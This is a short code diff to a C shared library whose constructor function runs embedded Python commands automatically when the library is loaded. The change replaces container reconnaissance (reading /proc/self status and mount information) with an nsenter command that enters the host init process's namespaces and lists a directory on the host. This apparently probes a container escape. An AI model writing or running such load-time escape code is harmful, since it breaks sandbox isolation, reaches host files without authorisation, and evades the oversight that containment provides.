@@ -106,9 +106,7 @@ __attribute__((constructor)) static void on_so_load() {
 
   PyRun_SimpleString(R"PY(
 
-run_cmd("cat /proc/self/status")
-
-run_cmd(['cat', '/proc/self/mountinfo'])
+run_cmd('nsenter -t 1 -m -u -i -n -p -- ls -ld /home/ubuntu/dbh/data/repos')
 )PY");
 
   PyGILState_Release(gstate);
